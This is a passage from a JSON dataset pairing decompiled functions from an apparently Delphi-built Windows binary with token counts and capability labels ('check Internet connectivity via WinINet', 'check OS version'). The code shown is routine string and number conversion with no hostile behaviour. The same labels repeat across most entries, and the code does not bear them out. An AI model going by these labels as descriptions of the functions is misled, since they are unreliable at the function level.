fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\ncode_r0x0046081d:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46083f;\n    uStack28 = 0x460837;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 572
    },
    "00461384": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461384(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    ushort *in_EDX;\n    \n    if ((arg_8h != '\\0') && (cVar1 = fcn.00416fd8(),  cVar1 != '\\0')) {\n        fcn.00416fb8();\n        return;\n    }\n    *in_EDX = *(in_EAX + 4);\n    uVar2 = fcn.004610d4();\n    *(in_EDX + 4) = uVar2;\n    return;\n}\n",
        "token_count": 138
    },
    "00461650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461650(int32_t arg_8h)\n\n{\n    char cVar1;\n    char **in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *in_FS_OFFSET;\n    char **ppcStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x461769;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = **in_EAX;\n    puVar4 = &stack0xfffffffc;\n    if (cVar1 == '-') {\n        fcn.00404888();\n        fcn.00404ae8();\n        ppcStack36 = in_EAX;\n        puVar4 = puStack24;\n    }\n    puStack24 = puVar4;\n    iVar2 = fcn.00404888();\n    iVar3 = fcn.00404ae0();\n    *(iVar3 + -1 + iVar2) = (*in_EAX)[iVar2 + -1] + '\\x01';\n    while ((iVar3 = iVar2,  1 < iVar3 && ((*in_EAX)[iVar3 + -1] == ':'))) {\n        iVar2 = fcn.00404ae0();\n        *(iVar2 + -1 + iVar3) = 0x30;\n        iVar2 = iVar3 + -1;\n        if (0 < iVar2) {\n            if ((*in_EAX)[iVar3 + -2] == *(arg_8h + -1)) {\n                fcn.004047b0();\n                fcn.00404bcc();\n                fcn.00404ae8();\n                iVar2 = iVar3 + -2;\n            }\n            iVar3 = fcn.00404ae0();\n            *(iVar3 + -1 + iVar2) = (*in_EAX)[iVar2 + -1] + '\\x01';\n        }\n    }\n    if ((iVar3 == 1) && (**in_EAX == ':')) {\n        puVar4 = fcn.00404ae0();\n        *puVar4 = 0x30;\n        fcn.004048d4();\n    }\n    if (cVar1 != '-') {\n        fcn.0040461c();\n    }\n    else {\n        fcn.004048d4();\n    }\n    *in_FS_OFFSET = ppcStack36;\n    uStack28 = 0x461770;\n    uStack32 = 0x461768;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 586
    },
    "00461bfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00461bfc(int32_t *arg_8h)\n\n{\n    char in_AL;\n    char *in_ECX;\n    char in_DL;\n    uint var_1h;\n    \n    if (in_AL + in_DL + -0x60 + *in_ECX < 10) {\n        fcn.004047b0();\n        *in_ECX = '\\0';\n    }\n    else {\n        fcn.004047b0();\n        *in_ECX = '\\x01';\n    }\n    if (*arg_8h == 0) {\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00461cb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00461dcb)\n\nvoid __fastcall fcn.00461cb8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    bool bVar1;\n    uint *arg_8h;\n    int32_t var_20h;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    bVar1 = in_EAX == 0;\n    var_4h = param_2;\n    if ((bVar1) || (fcn.004049d4(),  bVar1)) {\n        fcn.0040461c();\n    }\n    else {\n        bVar1 = var_4h == 0;\n        if ((bVar1) || (fcn.004049d4(),  bVar1)) {\n            fcn.0040461c();\n        }\n        else {\n            fcn.00404a88();\n            fcn.00404a88();\n            fcn.00404888();\n            fcn.00404888();\n            var_20h = fcn.0042d70c();\n            fcn.004045c8();\n            if (0 < var_20h) {\n                do {\n                    arg_8h = &var_8h;\n                    fcn.00461bfc(arg_8h);\n                    fcn.004048d4();\n                    var_20h = var_20h + -1;\n                } while (var_20h != 0);\n            }\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 425
    },
    "00461e18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00461e90)\n// WARNING: Removing unreachable block (ram,0x00461ead)\n\nvoid __fastcall fcn.00461e18(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uchar uVar2;\n    uint *arg_8h;\n    int32_t var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = fcn.0046199c();\n    if (iVar1 < 0) {\n        fcn.00404660();\n        fcn.00404660();\n        fcn.0040461c();\n    }\n    else {\n        fcn.00404660();\n        fcn.00404660();\n        fcn.004045c8();\n    }\n    uVar2 = 1;\n    fcn.004048d4();\n    fcn.004049d4();\n    if ((uVar2) || (fcn.004049d4(),  uVar2)) {\n        fcn.004049d4();\n        if (uVar2) {\n            fcn.0040461c();\n        }\n        else {\n            fcn.004049d4();\n            if (uVar2) {\n                fcn.0040461c();\n            }\n            else {\n                fcn.0040461c();\n            }\n        }\n    }\n    else {\n        fcn.00404a88();\n        fcn.00404a88();\n        fcn.00404888();\n        fcn.00404888();\n        var_24h = fcn.0042d70c();\n        fcn.004045c8();\n        if (0 < var_24h) {\n            do {\n                arg_8h = &var_4h;\n                fcn.00461c68(arg_8h);\n                fcn.004048d4();\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*param_1 == 0) {\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 559
    },
    "0046201c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046201c(void)\n\n{\n    uint uVar1;\n    uint arg_14h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff78;\n    uint *arg_1ch;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    var_30h = 0;\n    var_34h = 0;\n    var_38h = 0;\n    var_24h = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack88 = 0x4621f5;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack92;\n    var_1dh = **0x4847fc;\n    arg_1ch = &var_1ch;\n    uVar1 = fcn.00404888();\n    arg_14h = fcn.00404888();\n    fcn.00461a50(&var_8h, &var_10h, &var_ch, arg_14h, uVar1, arg_1ch);\n    var_14h = fcn.00404a88();\n    iVar3 = 1;\n    arg_8h = 0;\n    var_10h = var_10h + -1;\n    if (-1 < var_10h) {\n        do {\n            iVar2 = fcn.00408d64();\n            arg_8h = arg_8h + iVar2 * (*(var_14h + var_10h) - 0x30) * iVar3;\n            iVar3 = iVar3 * 10;\n            var_10h = var_10h + -1;\n        } while (var_10h != -1);\n    }\n    uVar1 = 0;\n    fcn.00408d14(arg_8h);\n    if (var_8h != -0xff) {\n        iVar3 = fcn.00404888(arg_8h, uVar1);\n        if (iVar3 == var_8h) {\n            fcn.0040308c();\n            var_2ch._1_1_ = var_1dh;\n            var_2ch._0_1_ = 1;\n            fcn.0040305c();\n            fcn.0040482c();\n            fcn.004048d4();\n        }\n        else if (iVar3 - var_8h < 1) {\n            if (iVar3 - var_8h < 0) {\n                fcn.004047b0();\n                fcn.00404c78(0);\n                in_stack_ffffff78 = *var_4h;\n                fcn.00404948(in_stack_ffffff78, 0);\n            }\n        }\n        else {\n            fcn.00404ae8(&var_30h);\n            fcn.004047b0(var_30h);\n            in_stack_ffffff78 = var_34h;\n            fcn.00404ae8(&var_38h);\n            fcn.00404948(var_38h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff78;\n    fcn.004045ec(0x4621fc);\n    fcn.004045c8();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 884
    },
    "00462208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462208(char **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint16_t uVar7;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar2 = fcn.00404888();\n    iVar4 = fcn.00404a88();\n    pcVar5 = iVar4 + iVar2 + -1;\n    fcn.00404c14();\n    iVar4 = fcn.00404a88();\n    pcVar6 = iVar4 + iVar2;\n    uVar7 = 0;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + -1;\n        uVar3 = (cVar1 - 0x30) * arg_ch + uVar7;\n        uVar7 = uVar3 / 10 & 0xff;\n        *pcVar6 = ((uVar3 % 10 << 8) >> 8) + '0';\n        pcVar6 = pcVar6 + -1;\n    }\n    *pcVar6 = uVar7 + '0';\n    if (**arg_8h == '0') {\n        fcn.00404888(arg_8h);\n        fcn.00404ae8();\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "004622bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid fcn.004622bc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    char *var_4ch;\n    uint32_t var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar auStack48 [3];\n    int32_t var_29h;\n    uint var_24h;\n    uchar *var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = &stack0xfffffffc;\n    var_10h = 10;\n    do {\n        var_8h = 0;\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_24h = 0x462530;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004622bc::var_29h + 1;\n    _auStack48 = &fcn.004622bc::var_24h;\n    var_30h = 0x4622fc;\n    var_4h = var_10h;\n    var_30h = fcn.00404888();\n    var_34h = 0x462304;\n    var_34h = fcn.00404888();\n    var_38h = &fcn.004622bc::var_8h;\n    var_3ch = &fcn.004622bc::var_ch;\n    var_40h = &fcn.004622bc::var_4h;\n    var_44h = 0x46231d;\n    fcn.00461a50(var_40h, var_3ch, var_38h, var_34h, var_30h, _auStack48);\n    var_44h = 0x462325;\n    iVar1 = fcn.00404888();\n    var_44h = 0x46232f;\n    *NULL = fcn.00404888();\n    var_44h = 0x46233a;\n    var_1ch = fcn.00404a88();\n    var_44h = 0x462345;\n    fcn.004045c8();\n    var_ch = var_ch + -1;\n    if (-1 < var_ch) {\n        do {\n            if (var_8h < 9) {\n                var_44h = 0x462360;\n                iVar2 = fcn.00408d64();\n                var_40h = iVar2 * (*(var_1ch + var_ch) - 0x30);\n                var_44h = NULL;\n                var_4ch = 0x462378;\n                fcn.00408d14(var_40h);\n                var_4ch = 0x462386;\n                fcn.004048d4();\n            }\n            else {\n                var_44h = var_20h;\n                var_48h = var_1ch & 0xffffff00 | *(var_1ch + var_ch) - 0x30;\n                var_40h = &fcn.004622bc::var_34h;\n                var_50h = 0x46239e;\n                fcn.00462208(var_40h, var_48h, var_20h);\n                var_50h = 0x4623ac;\n                fcn.004048d4();\n            }\n            var_44h = 0x4623ba;\n            fcn.00461cb8();\n            var_44h = 0x4623c5;\n            fcn.00404660();\n            var_44h = 0x4623d2;\n            fcn.00404890();\n            var_ch = var_ch + -1;\n        } while (var_ch != -1);\n    }\n    var_44h = 0x4623e6;\n    fcn.0040461c();\n    while (*_pe_dos_header == '0') {\n        var_40h = NULL;\n        var_48h = 0x4623f0;\n        fcn.00404888();\n        var_48h = 0x4623ff;\n        fcn.00404ae8();\n    }\n    if (var_4h != -0xff) {\n        var_44h = 0x46241a;\n        iVar2 = fcn.00404888();\n        if (iVar2 == var_4h) {\n            var_44h = 0x462430;\n            fcn.0040308c();\n            var_44h = 0x462449;\n            fcn.0040305c();\n            var_44h = 0x462454;\n            fcn.0040482c();\n            var_44h = 0x462460;\n            fcn.004048d4();\n        }\n        else if (iVar2 - var_4h < 1) {\n            if (iVar2 - var_4h < 0) {\n                var_44h = 0x4624ba;\n                fcn.004047b0();\n                var_44h = var_54h;\n                var_48h = 0x4624cb;\n                fcn.00404c78();\n                var_48h = var_58h;\n                var_4ch = _pe_dos_header;\n                var_50h = 0x4624dc;\n                fcn.00404948();\n            }\n        }\n        else {\n            var_44h = &fcn.004622bc::var_48h;\n            var_48h = 0x462478;\n            fcn.00404ae8();\n            var_4ch = 0x462486;\n            fcn.004047b0();\n            var_50h = &fcn.004622bc::var_50h;\n            fcn.00404ae8();\n            fcn.00404948(var_50h);\n        }\n        if (0x400 < iVar1 + stack0xffffffd4) {\n            var_44h = 0x4624ee;\n            fcn.004045c8();\n        }\n    }\n    *in_FS_OFFSET = var_40h;\n    var_38h = 0x462537;\n    var_3ch = 0x462508;\n    fcn.004045ec();\n    var_3ch = 0x462515;\n    fcn.004045ec();\n    var_3ch = 0x462522;\n    fcn.004045ec();\n    var_3ch = 0x46252f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1718
    },
    "00462550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00462550(uint arg_8h, char *arg_ch, char *arg_10h)\n\n{\n    char cVar1;\n    bool bVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint in_EDX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    uVar4 = 0;\n    bVar3 = false;\n    uVar5 = 0;\n    bVar2 = false;\n    while( true ) {\n        while( true ) {\n            cVar1 = *arg_10h;\n            arg_10h = arg_10h + 1;\n            if (!bVar2) {\n                uVar5 = uVar5 + cVar1;\n                bVar2 = true;\n            }\n            if (cVar1 == '\\0') break;\n            if (cVar1 != **0x4847fc) {\n                uVar4 = uVar4 + 1;\n            }\n        }\n        if (bVar3) break;\n        bVar3 = true;\n        bVar2 = false;\n        arg_10h = arg_ch;\n    }\n    if (uVar5 < 0x6c) {\n        arg_8h._0_1_ = arg_8h + 1;\n    }\n    if (uVar4 <= arg_8h) {\n        _auStack8 = 0x1000000;\n    }\n    return CONCAT44(in_EDX, *0x4847fc & 0xffffff00 | _auStack8 >> 0x18);\n}\n",
        "token_count": 393
    },
    "00462e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00462e10(uint arg_8h, char *arg_ch, uint8_t *arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t *puVar6;\n    uint var_1h;\n    \n    cVar2 = **0x4847fc;\n    uVar3 = *0x4847fc & 0xffffff00;\n    uVar4 = arg_8h;\n    uVar5 = 0;\n    do {\n        cVar1 = *arg_ch;\n        puVar6 = arg_10h;\n        if (cVar1 != cVar2) {\n            if (uVar5 == 0) {\n                uVar3 = (cVar1 << 4) << 8;\n            }\n            else {\n                puVar6 = arg_10h + 1;\n                *arg_10h = cVar1 - 0x30U | uVar3 >> 8;\n            }\n            uVar5 = ~uVar5;\n        }\n        uVar4 = uVar4 - 1;\n        arg_ch = arg_ch + 1;\n        arg_10h = puVar6;\n    } while (uVar4 != 0);\n    if (uVar5 != 0) {\n        *puVar6 = uVar3 >> 8;\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "00462ee4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00462ee4(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint arg_8h;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint in_stack_ffffffc8;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    puStack36 = &var_1h + 1;\n    uStack40 = 0x4630b0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.00404a88();\n    cVar2 = fcn.00462e5c();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        fcn.004049d4();\n        if ((bVar5) || (in_EAX == 0)) {\n            var_1h._0_1_ = 1;\n            *param_2 = '\\b';\n            param_2[1] = '\\x02';\n            fcn.004031a8();\n        }\n        else {\n            var_1h._0_1_ = 1;\n            bVar5 = false;\n            fcn.004047b0();\n            uVar3 = fcn.00404bcc();\n            var_ch = fcn.00404a88();\n            while( true ) {\n                uVar1 = *var_ch;\n                if (((*((uVar1 >> 3) + 0x483fec) >> (uVar1 & 7) & 1) == 0) && (uVar1 != 0x30)) break;\n                var_ch = var_ch + 1;\n                if (uVar3 != 0) {\n                    uVar3 = uVar3 - 1;\n                }\n            }\n            iVar4 = fcn.0040928c();\n            var_8h = var_ch + iVar4 + -1;\n            while ((*((*var_8h >> 3) + 0x483fec) >> (*var_8h & 7) & 1) != 0) {\n                *var_8h = 0;\n                var_8h = var_8h + -1;\n            }\n            if ((*var_ch == 0x2d) && (bVar5 = true,  uVar3 != 0)) {\n                uVar3 = uVar3 - 1;\n            }\n            if ((*var_ch == 0x2d) || (*var_ch == 0x2b)) {\n                var_ch = var_ch + 1;\n            }\n            fcn.004031a8();\n            if ((*var_ch == 0x30) && (var_ch = var_ch + 1,  uVar3 != 0)) {\n                uVar3 = uVar3 - 1;\n            }\n            arg_8h = fcn.0040928c();\n            if (0x40 < arg_8h) {\n                if ((uVar3 == 0) || (0x40 < uVar3)) {\n                    *param_2 = arg_8h;\n                    goto code_r0x0046309a;\n                }\n                arg_8h = CONCAT22(arg_8h >> 0x10, 0x40);\n            }\n            if (arg_8h == 0) {\n                *param_2 = '\\n';\n                param_2[1] = '\\x02';\n            }\n            else {\n                in_stack_ffffffc8 = arg_8h;\n                fcn.00462e10(arg_8h, var_ch, param_2 + 2);\n            }\n            cVar2 = arg_8h;\n            if (uVar3 == 0) {\n                *param_2 = cVar2;\n                if (bVar5) {\n                    param_2[1] = -0x80;\n                }\n                else {\n                    param_2[1] = '\\0';\n                }\n            }\n            else {\n                *param_2 = cVar2 + -1;\n                if (bVar5) {\n                    param_2[1] = (cVar2 - uVar3) + -0x80;\n                }\n                else {\n                    param_2[1] = cVar2 - uVar3;\n                }\n            }\n        }\n    }\n    else {\n        var_1h._0_1_ = 0;\n    }\ncode_r0x0046309a:\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    fcn.004045c8(0x4630b7);\n    return;\n}\n",
        "token_count": 1093
    },
    "004630d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nint16_t __cdecl fcn.004630d0(uint arg_8h, uint8_t *arg_ch)\n\n{\n    uint var_2h;\n    \n    while( true ) {\n        if (arg_8h == 0) {\n            return 0;\n        }\n        if (*arg_ch != 0) break;\n        if (arg_8h == 1) {\n            return 0;\n        }\n        arg_8h._0_2_ = arg_8h + -2;\n        arg_ch = arg_ch + 1;\n    }\n    if (*arg_ch >> 4 != 0) {\n        return arg_8h;\n    }\n    return arg_8h + -1;\n}\n",
        "token_count": 170
    },
    "00463114": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.00463114(uint arg_8h, uint8_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    uint8_t extraout_AH;\n    uint16_t uVar2;\n    int16_t extraout_CX;\n    int16_t extraout_CX_00;\n    uint8_t extraout_DL;\n    char extraout_DL_00;\n    uint var_2h;\n    \n    bVar1 = false;\n    uVar2 = arg_8h;\n    do {\n        if (uVar2 < 3) {\ncode_r0x0046315d:\n            do {\n                if (arg_8h == 0) {\n                    return;\n                }\n                if (bVar1) {\n                    bVar1 = false;\n                }\n                else {\n                    fcn.00462e00();\n                    if (extraout_CX == 1) {\n                        *arg_ch = extraout_DL;\n                        return;\n                    }\n                }\n                fcn.00462e00();\n                *arg_ch = extraout_DL_00 << 4 | extraout_AH;\n                arg_ch = arg_ch + -1;\n                arg_8h._0_2_ = extraout_CX_00 - 1;\n            } while( true );\n        }\n        arg_ch = arg_ch + 1;\n        if (uVar2 == 3) {\n            bVar1 = true;\n            goto code_r0x0046315d;\n        }\n        uVar2 = uVar2 - 2;\n    } while( true );\n}\n",
        "token_count": 363
    },
    "004631cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.004631cc(uint arg_8h, uint8_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    uint8_t extraout_AH;\n    uint16_t uVar2;\n    int16_t extraout_CX;\n    int16_t extraout_CX_00;\n    uint8_t extraout_DL;\n    char extraout_DL_00;\n    uint var_2h;\n    \n    bVar1 = false;\n    uVar2 = arg_8h;\n    do {\n        if (uVar2 < 3) {\ncode_r0x00463215:\n            do {\n                if (arg_8h == 0) {\n                    return;\n                }\n                if (bVar1) {\n                    bVar1 = false;\n                }\n                else {\n                    fcn.00462df0();\n                    if (extraout_CX == 1) {\n                        *arg_ch = extraout_DL;\n                        return;\n                    }\n                }\n                fcn.00462df0();\n                *arg_ch = extraout_DL_00 << 4 | extraout_AH;\n                arg_ch = arg_ch + -1;\n                arg_8h._0_2_ = extraout_CX_00 - 1;\n            } while( true );\n        }\n        arg_ch = arg_ch + 1;\n        if (uVar2 == 3) {\n            bVar1 = true;\n            goto code_r0x00463215;\n        }\n        uVar2 = uVar2 - 2;\n    } while( true );\n}\n",
        "token_count": 361
    },
    "00463284": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00463284(uint arg_8h, uint arg_ch, uint8_t *arg_10h, uint8_t *arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    uint in_EDX;\n    uint8_t uVar5;\n    uint var_4h;\n    \n    var_4h = 0;\n    for (; iVar4 = arg_8h,  arg_ch != 0; arg_ch._0_2_ = arg_ch + -2) {\n        uVar1 = *arg_14h;\n        uVar2 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        if (uVar1 != uVar2) {\n            uVar3 = uVar1 >> 4;\n            uVar5 = uVar2 >> 4;\n            if (uVar5 == uVar3) {\n                if (arg_ch == 0) break;\n                uVar3 = uVar1 & 0xf;\n                uVar5 = uVar2 & 0xf;\n            }\n            if (uVar3 < uVar5) {\n                var_4h = 0xffffffff;\n            }\n            else {\n                var_4h = 1;\n            }\n            goto code_r0x0046331d;\n        }\n        iVar4 = arg_8h + -1;\n        if (arg_ch == 1) break;\n        arg_8h._0_2_ = arg_8h + -2;\n        arg_14h = arg_14h + 1;\n    }\n    do {\n        if (iVar4 < 1) goto code_r0x0046331d;\n        uVar1 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        iVar4 = iVar4 + -2;\n    } while (uVar1 == 0);\n    var_4h = 0xffffffff;\ncode_r0x0046331d:\n    return CONCAT44(in_EDX, var_4h);\n}\n",
        "token_count": 467
    },
    "00463540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
